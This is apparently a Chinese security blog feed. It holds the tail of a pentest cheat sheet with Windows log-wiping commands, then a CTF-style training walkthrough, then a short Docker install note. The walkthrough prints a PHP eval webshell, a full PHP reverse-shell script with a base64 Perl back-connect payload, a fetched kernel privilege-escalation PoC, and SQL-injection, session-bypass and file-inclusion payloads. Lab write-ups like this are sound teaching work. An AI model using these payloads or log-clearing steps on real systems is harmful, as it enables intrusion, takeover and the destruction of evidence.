<li>2、打印机 <a href="https://github.com/RUB-NDS/PRET" target="_blank" rel="noopener">PRET </a></li>
<li>3、IOT exp <a href="https://www.exploitee.rs/" target="_blank" rel="noopener">https://www.exploitee.rs/</a></li>
<li>4、相关<br><a href="https://www.owasp.org/index.php/OWASP_Nettacker" target="_blank" rel="noopener">OWASP-Nettacker</a><br><a href="https://github.com/dark-lbp/isf" target="_blank" rel="noopener">isf</a><br><a href="https://github.com/w3h/icsmaster" target="_blank" rel="noopener">icsmaster</a></li>
</ul>
<h3 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h3><ul>
<li><a href="http://www.oxid.it/cain.html" target="_blank" rel="noopener">Cain</a> </li>
<li><a href="https://github.com/Ettercap/ettercap" target="_blank" rel="noopener">Ettercap</a> </li>
<li><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a> </li>
<li><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">MITMf</a> </li>
<li><a href="https://github.com/evilsocket/bettercap" target="_blank" rel="noopener">3r/MITMf)</a> </li>
</ul>
<h3 id="规避杀软及检测"><a href="#规避杀软及检测" class="headerlink" title="规避杀软及检测"></a>规避杀软及检测</h3><h4 id="Bypass-Applocker"><a href="#Bypass-Applocker" class="headerlink" title="Bypass Applocker"></a>Bypass Applocker</h4><p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">UltimateAppLockerByPassList </a><br><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a> </p>
<h4 id="bypassAV"><a href="#bypassAV" class="headerlink" title="bypassAV"></a>bypassAV</h4><ul>
<li>Empire </li>
<li>PEspin </li>
<li>Shellter </li>
<li>Ebowla </li>
<li>Veil </li>
<li>PowerShell </li>
<li>Python </li>
<li><a href="http://www.4hou.com/technology/9379.html" target="_blank" rel="noopener">代码注入技术Process Doppelgänging </a></li>
<li>…</li>
</ul>
<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">Windows日志清除</a></h3><p>获取日志分类列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>
<p>获取单个日志类别的统计信息：<br>eg.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>
<p>查看指定日志的具体内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil qe &#x2F;f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>删除单个日志类别的所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具 </p>
<ul>
<li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a> </li>
<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a> </li>
</ul>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run clearlogs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>
<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; &#x2F;a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>神马培训</title>
    <url>/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/</url>
    <content><![CDATA[<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>找到上传点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091445851.png" alt="image-20200715091445851"></p>
<p>上传一张正常图片，可以看到图片可以上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091559881.png" alt="image-20200715091559881"></p>
<p>再次上传该图片，使用burp抓包，发送到Repeater模块，修改文件后缀，将jpg文件后缀更改为php文件后缀，然后运行，查看页面是否返回路径，返回路径说明上传成功，相反，失败。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715091752731.png" alt="image-20200715091752731"></p>
<p>复制上传路径，在页面打开看看返回信息，如果能返回信息，说明正确。因为是将后缀改成了php所以页面返回乱码，而不是图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715092826103.png" alt="image-20200715092826103"></p>
<p>在图片的乱码中添加一句话木马（尽量不要添加在图片中乱码括号的内部），再次进行提交，查看页面是否返回上传路径</p>
<p>这里加入phpinfo是为了测试页面是否返回成功，如果返回成功显示phpinfo </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	eval(@_POST["pass"]);phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>复制该路径，在页面中进行访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093327206.png" alt="image-20200715093327206"></p>
<p> 页面返回了phpinfo说明上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093439811.png" alt="image-20200715093439811"></p>
<p>使用蚁剑或者菜刀进行连接，复制url，蚁剑连接密码就是一句话木马中，方括号中的内容<code>pass</code></p>
<p>这样就连接成功了，一般flag文件都在根目录下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093629429.png" alt="image-20200715093629429"></p>
<p>选择到根目录，找一下flag文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093753781.png" alt="image-20200715093753781"></p>
<p>找到flag文件，双击打开，里面就是flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715093824524.png" alt="image-20200715093824524"></p>
<h4 id="对靶机进行提权"><a href="#对靶机进行提权" class="headerlink" title="对靶机进行提权"></a>对靶机进行提权</h4><p>使用蚁剑的终端打开，使用<code>uname -a</code> 查看版本或者<code>cat /proc/version</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里的Ubuntu版本时16.04。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ubuntu 16.04 版本且 unprivileged_bpf_disable 权限没有关闭的情况下就会存在 提权漏洞</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看是否存在unprivileged_bpf_disable文件，如果存在该文件，查看文件内容是否为1，若不是1，则存在漏洞</span></span><br></pre></td></tr></table></figure>

<p>查看方式：<code>cat /proc/sys/kernel/unprivileged_bpf_disable</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100550432.png" alt="image-20200715100550432"></p>
<p><strong>下载poc文件</strong></p>
<p>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a></p>
<p>下载后，复制连接，使用wget进行下载 ，下载完成后并不是我们要的名字，所以将文件重命名，把 .c 后的内容删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715100841177.png" alt="image-20200715100841177"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101014327.png" alt="image-20200715101014327"></p>
<p>编译生成可执行文件，并赋予可执行权限</p>
<p><code>gcc -o upstream upstream44.c</code>可以将upstream只写u </p>
<p><code>gcc -o u upstream44.c</code></p>
<p>在给文件一个执行的权限</p>
<p><code>chmod a+x upstream</code></p>
<p>如果是在当前执行<code>./upstream44.c</code>是失败的，虽然也是返回shell，但是还是连接当前的权限</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715101447782.png" alt="image-20200715101447782"></p>
<p>所以我们需要上传一个反弹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function which($pr) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">path = execute(<span class="string">"which <span class="variable">$pr</span>"</span>); </span></span><br><span class="line">return ($path ? $path : $pr); </span><br><span class="line">&#125; </span><br><span class="line">function execute($cfe) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = <span class="string">''</span>; </span></span><br><span class="line">if ($cfe) &#123; </span><br><span class="line">if(function_exists('exec')) &#123; </span><br><span class="line"><span class="meta">@exec($</span><span class="bash">cfe,<span class="variable">$res</span>); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = join(<span class="string">"\n"</span>,<span class="variable">$res</span>); </span></span><br><span class="line">&#125; elseif(function_exists('shell_exec')) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = @shell_exec(<span class="variable">$cfe</span>); </span></span><br><span class="line">&#125; elseif(function_exists('system')) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line"><span class="meta">@system($</span><span class="bash">cfe); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = @ob_get_contents(); </span></span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; elseif(function_exists('passthru')) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line"><span class="meta">@passthru($</span><span class="bash">cfe); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">res = @ob_get_contents(); </span></span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res = <span class="string">''</span>; </span></span><br><span class="line">while(!@feof($f)) &#123; </span><br><span class="line"><span class="meta">$</span><span class="bash">res .= @fread(<span class="variable">$f</span>,1024); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">@pclose($</span><span class="bash">f); </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">return $res; </span><br><span class="line">&#125; </span><br><span class="line">function cf($fname,$text)&#123; </span><br><span class="line"><span class="meta">if($</span><span class="bash">fp=@fopen(<span class="variable">$fname</span>,<span class="string">'w'</span>)) &#123; </span></span><br><span class="line"><span class="meta">@fputs($</span><span class="bash">fp,@base64_decode(<span class="variable">$text</span>)); </span></span><br><span class="line"><span class="meta">@fclose($</span><span class="bash">fp); </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">$</span><span class="bash">yourip = <span class="string">"Ip"</span>; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">yourport = <span class="string">'Port'</span>; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">usedb = array(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </span></span><br><span class="line"><span class="meta">$</span><span class="bash">back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </span></span><br><span class="line">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". </span><br><span class="line">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". </span><br><span class="line">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". </span><br><span class="line">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". </span><br><span class="line">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". </span><br><span class="line">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; </span><br><span class="line">cf('/tmp/.bc',$back_connect); </span><br><span class="line"><span class="meta">$</span><span class="bash">res = execute(<span class="built_in">which</span>(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc <span class="variable">$yourip</span> <span class="variable">$yourport</span> &amp;"</span>); </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在kali中进行端口监听</p>
<p><code>nc -lvp [Port]</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715102933268.png" alt="image-20200715102933268"></p>
<p>shell上传成功，我们就来访问一下这个shell，在查看kali，这样就可以看到已经监听到了这个shell</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103053164.png" alt="image-20200715103053164"></p>
<p>可以使用ls查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103122196.png" alt="image-20200715103122196"></p>
<p>我们先输入u，查看，在输入id 查看当前权限，输入<code>./u</code>在输入id查看当前权限</p>
<p>可以成功看到当前全县是root了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103254238.png" alt="image-20200715103254238"></p>
<p>使用passwd改一下密码，这里更改完远程连接root是不能直接登录的。</p>
<p>因为Ubuntu通常情况下会禁止直接连接root</p>
<p><code>ssh root@Ip</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103532619.png" alt="image-20200715103532619"></p>
<p>所以我们新建一个用户，然后登录这个用户。</p>
<p><code>useradd test</code> 、<code>passwd test</code> 设置密码</p>
<p>使用ssh连接test接口</p>
<p><code>ssh test@Ip</code>，这个时候就能重新连接了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103809478.png" alt="image-20200715103809478"></p>
<p>在使用su登录root，可以看到现在就变成了root权限了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715103855295.png" alt="image-20200715103855295"></p>
<p>可以看到flag文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104024194.png" alt="image-20200715104024194"></p>
<p>cat 一下这个文件。查看里面的内容，里面就是flag文件 </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104143692.png" alt="image-20200715104143692"></p>
<h4 id="主机发现和端口扫描"><a href="#主机发现和端口扫描" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h4><p>使用<code>netdiscover -r 172.24.10.0/24</code></p>
<p>就会把网址给搜索出来，这是知道ip的情况下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104616113.png" alt="image-20200715104616113"></p>
<p>如果不知道ip直接使用<code>netdisconver</code>来全部扫描，这样扫描需要等待一段时间，因为他要查找。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715104805665.png" alt="image-20200715104805665"></p>
<p>扫描到之后我们可以使用Nmap查看开放了哪些服务</p>
<p><code>nmap -sv 172.24.10.142</code> </p>
<p>可以看到开放了一个80和22端口</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105023380.png" alt="image-20200715105023380"></p>
<p>使用<code>nmap -O 172.24.10.142</code>查看版本，可以看到是一个linux系统</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105146419.png" alt="image-20200715105146419"></p>
<p>我们访问22接口，以为我们不知道密码所以先取消，在页面访问80端口，返回页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105357560.png" alt="image-20200715105357560"></p>
<p>这样我们需要找一下漏洞，可以看到url返回id，可能存在sql注入，使用单引号和%df来查看是否有sql注入，经过测试发现页面都返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105442103.png" alt="image-20200715105442103"></p>
<p>看看是否有其他漏洞，在搜索框输入1，看到url中的key显示1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715105945921.png" alt="image-20200715105945921"></p>
<p>检查一下这个内容是怎么提交的</p>
<p>可以看到他是value值进行提交上去的，这个时候就会产生xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110103640.png" alt="image-20200715110103640"></p>
<p>我们试试xss漏洞是否可行</p>
<p><code>&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
<p>可以看到他将我们的xss进行url编码了，所以并没有弹框，说明这里没有xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715110358094.png" alt="image-20200715110358094"></p>
<p>我们可以使用御剑，或者dirsearch来爆破后台、目录</p>
<p>这里使用dirsearch，先进入dirsearch的目录，使用python3运行</p>
<p>格式：<code>python3 dirsearch -u  url/* php</code></p>
<p>怎么知道它的类型是php的呢，直接在页面的url后面加入index.php页面还是返回当前页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111232072.png" alt="image-20200715111232072"></p>
<p>可以看到搜索出一个admin/login.php，我们就找到了他的后台</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111350009.png" alt="image-20200715111350009"></p>
<p>在页面中进行访问，这样就进入了他的后台，因为他的账号和密码我们是不知道的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111450894.png" alt="image-20200715111450894"></p>
<p>所以我们先使用万能密码尝试登陆</p>
<p>使用<code>admin&#39;</code>密码随便输入，页面返回操作数据库失败</p>
<p>并返回了以下重要内容，从这里就可以判断这里存在sql注入，因为他把我们admin上面带的单引号给带入了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111749443.png" alt="image-20200715111749443"></p>
<p>我们将单引号后面加上注释符，再次登录查看页面返回，可以看到页面返回输入的密码错误</p>
<p>说明他去把用户名进行查询，然后在将我们输入的密码和他的密码进行对比，然后密码不正确，所以登录不进去</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715111953521.png" alt="image-20200715111953521"></p>
<p> 可以进行一个盲注</p>
<p>格式：<code>admin&#39; and sleep(5)</code>，可以看到页面进行了延迟，通过这种注入方式得到最后的后台密码admin</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113008271.png" alt="image-20200715113008271"></p>
<p>使用admin、admin登录，这样就成功登录到后台去了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715113146868.png" alt="image-20200715113146868"></p>
<h4 id="代码审计sql注入"><a href="#代码审计sql注入" class="headerlink" title="代码审计sql注入"></a>代码审计sql注入</h4><p>进入靶场文件，进入admin，查看admin下的 内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141329679.png" alt="image-20200715141329679"></p>
<p>输入IP找到后台在页面抓一下包，提交信息，查看Networdk会发现login.php=ck.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141720932.png" alt="image-20200715141720932"></p>
<p>等会就会返回login.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715141958853.png" alt="image-20200715141958853"></p>
<p>cat查看一下login.php的源码，可以看到判断登录的地方$action=ch_login</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142136524.png" alt="image-20200715142136524"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">global # 设置了一些全局</span><br><span class="line"><span class="meta">$</span><span class="bash">submit=<span class="variable">$_</span> POST[<span class="string">'submit'</span>];就是提交按钮</span></span><br><span class="line">把user传给了 fl_value 又把 fl_value 传给了 fl_html</span><br><span class="line"><span class="meta">$</span><span class="bash">code = <span class="variable">$_POST</span>[<span class="string">'code'</span>]; <span class="comment"># post['code']等于$code</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142406921.png" alt="image-20200715142406921"></p>
<p>查看 fl_value 是在哪个目录下，回到html目录</p>
<p>命令:<code>grep &quot;fl_value -R ./&quot;</code></p>
<p>我们要找到function函数，可以看到前面显示的路径includes/fun.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143239730.png" alt="image-20200715143239730"></p>
<p>vim查看一下改文件</p>
<p><code>vim includes/fun,php</code>复制fl_value，打开文件后直接粘贴，会在下方显示，不能在插入模式下粘贴。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143708652.png" alt="image-20200715143708652"></p>
<p>搜索出以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">funtion过来一个fl_value值，将$str传进去，进行了一个匹配，有delete和outfile，如果有替换为空</span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144147152.png" alt="image-20200715144147152"></p>
<p>在查看login.php文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">可以看到又调用了 cheack_login()函数 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断从哪个页面进入的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断用户名、密码是不是为空</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断验证码正不正确</span></span><br><span class="line">然后提交给了cheack_login()函数</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144228855.png" alt="image-20200715144228855"></p>
<p>查看一下cheack_login()函数在哪个路径下</p>
<p>命令：<code>grep &quot;cheack_login&quot; -R ../</code></p>
<p>可以看到还是正在include/fun.php文件下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144644012.png" alt="image-20200715144644012"></p>
<p>复制cheack_login，打开fun.php，还是按照之前的方法进行黏贴</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144833750.png" alt="image-20200715144833750"></p>
<p>可以看到他直接吧.$user变量直接给拼接进去了，所以就会产生sql注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145058441.png" alt="image-20200715145058441"></p>
<h4 id="代码审计越权漏洞"><a href="#代码审计越权漏洞" class="headerlink" title="代码审计越权漏洞"></a>代码审计越权漏洞</h4><p>继续审计login.php</p>
<p>判断login和admin不为空直接跳转到admin.php，这个时候就可以想到越权漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145659286.png" alt="image-20200715145659286"></p>
<p>进行测试，访问前台，使用hackbar的Post data复制粘贴上面红线</p>
<p>_ SESSION[‘login_in’]&amp;&amp;_SESSION[‘admin’]不要$符，让login_in和admin都等于1，方括号中不要单引号.</p>
<p>还要设置一下会话时间设置 </p>
<p><code>_ SESSION[login_time]=999999999999</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=999999999999</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150514414.png" alt="image-20200715150514414"></p>
<p>再次访问后台登录页面，这个时候就不需要密码直接进入后台了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150600196.png" alt="image-20200715150600196"></p>
<h4 id="代码审计文件包含漏洞"><a href="#代码审计文件包含漏洞" class="headerlink" title="代码审计文件包含漏洞"></a>代码审计文件包含漏洞</h4><p>继续查看admin.php文件，可以看到这样一行命令</p>
<p><code>$_GET[&#39;file]等于file，include($_GET[&#39;file&#39;]也等于file</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150917265.png" alt="image-20200715150917265"></p>
<p>这样就存在文件包含漏洞，在页面url后面输入<code>?file=/etc/passwd</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151244021.png" alt="image-20200715151244021"></p>
<p> 再查看一下php.ini看他是不是远程文件包含，使用find查看一下路径</p>
<p><code>find / -name php.ini</code>找一下php.ini的位置</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151515218.png" alt="image-20200715151515218"></p>
<p>找到路径，使用vi打开该文件，是off，没有远程文件包含</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152156668.png" alt="image-20200715152156668"></p>
<h4 id="代码审计后台漏洞"><a href="#代码审计后台漏洞" class="headerlink" title="代码审计后台漏洞"></a>代码审计后台漏洞</h4><p>查看一下config.php文件，使用find搜索路径</p>
<p><code>find / -name config.php</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152556277.png" alt="image-20200715152556277"></p>
<p>cat 一下这个路径，可以看到在config这个文件里有一个一句话木马，我们来对他进行一个访问，看看能否执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152629952.png" alt="image-20200715152629952"></p>
<p>在url中传输一个d执行linux命令，然后在PSOT传入b执行ls查看当前路径下的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153011666.png" alt="image-20200715153011666"></p>
<h4 id="逻辑漏洞之验证码不失效"><a href="#逻辑漏洞之验证码不失效" class="headerlink" title="逻辑漏洞之验证码不失效"></a>逻辑漏洞之验证码不失效</h4><p>页面是先验证验证码是否正确，在验证账号密码</p>
<p>当验证码输入错误的时候</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153553499.png" alt="image-20200715153553499"></p>
<p>可以当验证码输入正确时返回输入密码不正确，4秒返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153715522.png" alt="image-20200715153715522"></p>
<p>在这4秒内自己后退返回，他的验证码是不变的，这样就可以再次使用这个验证码来进行验证，所以这里就可以使用bp来进行抓包，然后发送到Repeater模块进行测试，这个期间因为是抓包所以页面是不动的，这也就导致了验证码不刷新</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153933440.png" alt="image-20200715153933440"></p>
<p>因为我们之前测试知道了用户名处存在sql注入，在这里将用户名后面改为aaa*这里的 * 表示所有，然后选中所有，另存为txt文本使用sqlmap记性自动注入</p>
<p><code>sqlmap -r 文件名 --dbs</code>这样就注入出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715154320109.png" alt="image-20200715154320109"></p>
]]></content>
  </entry>
  <entry>
    <title>docker</title>
    <url>/2020/07/25/docker/</url>
    <content><![CDATA[<h4 id="docker功能描述"><a href="#docker功能描述" class="headerlink" title="docker功能描述"></a>docker功能描述</h4><p>第一步，查看内核版本，目前Docker最支持Centos7，需要安装在64位的平天上并且内核版本需要高于3.10。检查内核版本的命令如下。</p>
<p><code>uname -r</code>命令查看系统内核版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502142749009.png" alt="image-20200502142749009"></p>
<p><code>docker version</code>命令实现安装验证及版本查看</p>
<p>第二步，使用脚本自动安装Docker。脚本会自动将Docker依赖环境配置完成，并在系统中进行Docker的安装。由于Docker的软件园在国外，下载会有延迟，很有可能因为网络环境导致下载错误。为避免发生错误，可以使用国内的软件源镜像安装，比如使用阿里云安装使用DaoCloud安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用脚本自动安装Docker</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.docker.com&#x2F;1 sh </span><br><span class="line">&#x2F;&#x2F; 使用阿里云安装Docker</span><br><span class="line">curl -sSL http:&#x2F;&#x2F;acs-public-mirror.oss-cn-hangzhou.aliyuncs.com&#x2F;docker-engine&#x2F;intemet | sh</span><br><span class="line">&#x2F;&#x2F; 使用DaoCloud安装Docker</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>

<p>安装完成后，使用<code>docker --version</code>来查看docker版本</p>
<p>当前Docker版本为17.12</p>
